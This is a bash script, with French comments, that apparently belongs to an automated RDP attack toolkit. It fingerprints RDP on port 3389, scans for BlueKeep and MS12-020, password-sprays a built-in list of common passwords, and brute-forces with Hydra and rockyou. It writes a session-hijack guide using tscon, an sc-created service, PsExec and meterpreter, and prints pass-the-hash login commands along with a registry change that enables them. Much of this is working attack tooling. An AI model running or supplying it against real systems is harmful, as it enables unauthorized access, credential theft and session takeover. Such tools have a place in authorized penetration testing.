#!/usr/bin/env bash
# ╔══════════════════════════════════════╗
# ║   Auto-Enum — RDP (3389)            ║
# ║   Usage: ./enum_rdp.sh <TARGET> [USER] [PASS] [DOMAIN]
# ╚══════════════════════════════════════╝
source "$(dirname "$0")/lib/common.sh"

TARGET="$1"
USER="${2:-}"
PASS="${3:-}"
DOMAIN="${4:-}"

require_target "$TARGET"
banner "RDP (port 3389)" "$TARGET"
OUTDIR=$(setup_outdir "$TARGET" "rdp")

NXC=$(command -v nxc || command -v crackmapexec)

# ─── 1. FINGERPRINT ─────────────────────────────────────────
section "1. FINGERPRINT"

run "Nmap — RDP scripts" "$OUTDIR/nmap_rdp.txt" \
    nmap -sV -sC "$TARGET" -p3389 \
    --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-enum-encryption \
    -oN "$OUTDIR/nmap_rdp_raw.txt"

# Info nxc
if [[ -n "$NXC" ]]; then
    info "nxc — fingerprint RDP"
    $NXC rdp "$TARGET" 2>&1 | tee "$OUTDIR/nxc_info.txt"

    OS=$(grep -oP 'Windows\s+\S+(\s+\S+)?' "$OUTDIR/nxc_info.txt" 2>/dev/null | head -1)
    HOSTNAME=$(grep -oP '\(name:\K[^)]+' "$OUTDIR/nxc_info.txt" 2>/dev/null | head -1)
    [[ -n "$OS" ]] && finding "OS : $OS"
    [[ -n "$HOSTNAME" ]] && finding "Hostname : $HOSTNAME"
fi

# Encryption level
ENC=$(grep -oP 'encryption:\K\s*\S+' "$OUTDIR/nmap_rdp.txt" 2>/dev/null | head -1)
[[ -n "$ENC" ]] && info "Encryption : $ENC"

# NLA check
if grep -qi "NLA\|Network Level Auth\|CredSSP" "$OUTDIR/nmap_rdp.txt" "$OUTDIR/nxc_info.txt" 2>/dev/null; then
    info "NLA (Network Level Authentication) activé"
    echo "NLA_ENABLED" >> "$OUTDIR/findings.txt"
else
    warn "NLA non détecté — login screen exposé (possible brute force sans auth)"
fi

# ─── 2. VULNÉRABILITÉS CONNUES ──────────────────────────────
section "2. CHECK VULNÉRABILITÉS RDP"

# BlueKeep (CVE-2019-0708)
info "Test BlueKeep (CVE-2019-0708)"
run "BlueKeep scan" "$OUTDIR/bluekeep.txt" \
    nmap -sV --script rdp-vuln-ms12-020 "$TARGET" -p3389

if grep -qi "VULNERABLE" "$OUTDIR/bluekeep.txt" 2>/dev/null; then
    success "BlueKeep VULNÉRABLE !"
    finding "CVE-2019-0708 (BlueKeep) — RCE pré-auth !"
    echo "BLUEKEEP_CVE-2019-0708" >> "$OUTDIR/findings.txt"
else
    info "BlueKeep non détecté via nmap"
fi

# DejaBlue (CVE-2019-1181/1182)
if [[ -n "$NXC" ]]; then
    info "Test DejaBlue (CVE-2019-1181)"
    $NXC rdp "$TARGET" -M rdp 2>&1 | grep -i "vuln\|CVE\|blue" | tee "$OUTDIR/dejablue.txt"
fi

# MS12-020 (DoS)
MS12=$(grep -i "MS12-020\|CVE-2012-0152\|CVE-2012-0002" "$OUTDIR/nmap_rdp.txt" 2>/dev/null)
[[ -n "$MS12" ]] && {
    warn "MS12-020 détecté → potential DoS"
    echo "MS12-020" >> "$OUTDIR/findings.txt"
}

# ─── 3. BRUTE FORCE / PASSWORD SPRAY ───────────────────────
section "3. BRUTE FORCE / PASSWORD SPRAY"

if [[ -n "$USER" && -n "$NXC" ]]; then
    DOMAIN_FLAG=""
    [[ -n "$DOMAIN" ]] && DOMAIN_FLAG="-d $DOMAIN"

    if [[ -n "$PASS" ]]; then
        info "Test credentials : $USER:$PASS"
        $NXC rdp "$TARGET" -u "$USER" -p "$PASS" $DOMAIN_FLAG 2>&1 | tee "$OUTDIR/auth_test.txt"

        if grep -q "\[+\]" "$OUTDIR/auth_test.txt"; then
            success "ACCÈS RDP VALIDE !"
            echo "$USER:$PASS" > "$OUTDIR/valid_creds.txt"
        else
            error "Credentials invalides"
        fi
    fi

    # Password spray avec mots de passe courants
    if [[ -z "$PASS" ]] || [[ ! -s "$OUTDIR/valid_creds.txt" ]]; then
        SPRAY_LIST="/tmp/rdp_spray.txt"
        cat > "$SPRAY_LIST" << 'EOF'
Password123
Password123!
Welcome1
Welcome1!
Summer2024
Winter2024
Admin123
Admin@123
P@ssw0rd
EOF
        echo "$USER" >> "$SPRAY_LIST"
        echo "${USER}123" >> "$SPRAY_LIST"
        echo "${USER}@123" >> "$SPRAY_LIST"

        info "Password spray RDP"
        $NXC rdp "$TARGET" -u "$USER" -p "$SPRAY_LIST" \
            --continue-on-success $DOMAIN_FLAG 2>&1 | tee "$OUTDIR/spray.txt"
        grep "\[+\]" "$OUTDIR/spray.txt" 2>/dev/null | tee -a "$OUTDIR/valid_creds.txt"
    fi
fi

# Hydra brute force si userlist dispo
if [[ ! -s "$OUTDIR/valid_creds.txt" ]] && check_tool hydra; then
    if [[ -n "$USER" ]]; then
        warn "Brute force Hydra RDP (timeout 90s)"
        PASSLIST=""
        for wl in \
            "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt" \
            "/usr/share/wordlists/rockyou.txt"; do
            [[ -f "$wl" ]] && PASSLIST="$wl" && break
        done

        [[ -n "$PASSLIST" ]] && {
            run_long "Hydra RDP" "$OUTDIR/hydra.txt" 90 \
                hydra -l "$USER" -P "$PASSLIST" -t 1 rdp://"$TARGET"
            grep "login:\|password:" "$OUTDIR/hydra.txt" 2>/dev/null | \
                tee -a "$OUTDIR/valid_creds.txt"
        }
    fi
fi

# ─── 4. SESSION HIJACKING ───────────────────────────────────
section "4. SESSION HIJACKING (si admin local)"

if [[ -s "$OUTDIR/valid_creds.txt" ]] && [[ -n "$NXC" ]]; then
    VALID_LINE=$(head -1 "$OUTDIR/valid_creds.txt")
    V_USER="${VALID_LINE%%:*}"
    V_PASS="${VALID_LINE##*:}"
    DOMAIN_FLAG=""
    [[ -n "$DOMAIN" ]] && DOMAIN_FLAG="-d $DOMAIN"

    info "Listing sessions RDP actives"
    $NXC rdp "$TARGET" -u "$V_USER" -p "$V_PASS" $DOMAIN_FLAG 2>&1 | tee "$OUTDIR/sessions.txt"
fi

# Guide hijacking manuel
cat >> "$OUTDIR/session_hijack_guide.txt" << 'GUIDE'
=== SESSION HIJACKING RDP (SYSTEM requis) ===

# 1. Lister les sessions (sur la machine cible)
query session

# 2. Identifier une session déconnectée (State: Disc)

# 3. Hijack sans password (nécessite SYSTEM)
tscon <SESSION_ID> /dest:<VOTRE_SESSION>

# Via cmd SYSTEM :
sc create hijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#0"
sc start hijack

# Via psexec pour obtenir SYSTEM :
PsExec.exe -s -i cmd.exe

# Via token impersonation :
# meterpreter> getsystem
# meterpreter> session_hijack <id>
GUIDE

info "Guide de session hijack : $OUTDIR/session_hijack_guide.txt"

# ─── 5. SCREENSHOT / ACCÈS RDP ──────────────────────────────
section "5. ACCÈS RDP"

if [[ -s "$OUTDIR/valid_creds.txt" ]]; then
    VALID_LINE=$(head -1 "$OUTDIR/valid_creds.txt")
    V_USER="${VALID_LINE%%:*}"
    V_PASS="${VALID_LINE##*:}"

    echo ""
    success "Credentials valides pour connexion RDP :"

    # xfreerdp
    XFREERDP_CMD="xfreerdp /v:${TARGET} /u:${V_USER} /p:${V_PASS}"
    [[ -n "$DOMAIN" ]] && XFREERDP_CMD+=" /d:${DOMAIN}"
    XFREERDP_CMD+=" /dynamic-resolution +clipboard /cert:ignore"

    info "Commande xfreerdp :"
    echo -e "${CYAN}  $XFREERDP_CMD${NC}"

    # rdesktop fallback
    RDESKTOP_CMD="rdesktop ${TARGET} -u ${V_USER} -p ${V_PASS}"
    [[ -n "$DOMAIN" ]] && RDESKTOP_CMD+=" -d ${DOMAIN}"
    info "Commande rdesktop (fallback) :"
    echo -e "${CYAN}  $RDESKTOP_CMD${NC}"

    # NXC pass-the-hash
    if [[ "$V_PASS" =~ ^[a-fA-F0-9]{32}$ ]]; then
        info "Hash NTLM détecté — connexion PTH :"
        PTH_CMD="xfreerdp /v:${TARGET} /u:${V_USER} /pth:${V_PASS}"
        [[ -n "$DOMAIN" ]] && PTH_CMD+=" /d:${DOMAIN}"
        PTH_CMD+=" /dynamic-resolution +clipboard /cert:ignore"
        echo -e "${CYAN}  $PTH_CMD${NC}"
        echo ""
        warn "Note: PTH RDP nécessite 'Restricted Admin Mode' activé sur la cible"
        warn "Activer avec: reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0"
    fi
fi

# ─── SUMMARY ────────────────────────────────────────────────
summary "$OUTDIR"

echo -e "${WHITE}━━━ RÉSUMÉ RAPIDE ━━━${NC}"
[[ -n "$OS" ]] && info "OS : $OS"
[[ -n "$HOSTNAME" ]] && info "Hostname : $HOSTNAME"

[[ -s "$OUTDIR/valid_creds.txt" ]] && {
    echo ""
    success "Credentials valides :"
    cat "$OUTDIR/valid_creds.txt"
}

[[ -s "$OUTDIR/findings.txt" ]] && {
    echo ""
    warn "FINDINGS IMPORTANTS :"
    cat "$OUTDIR/findings.txt"
}
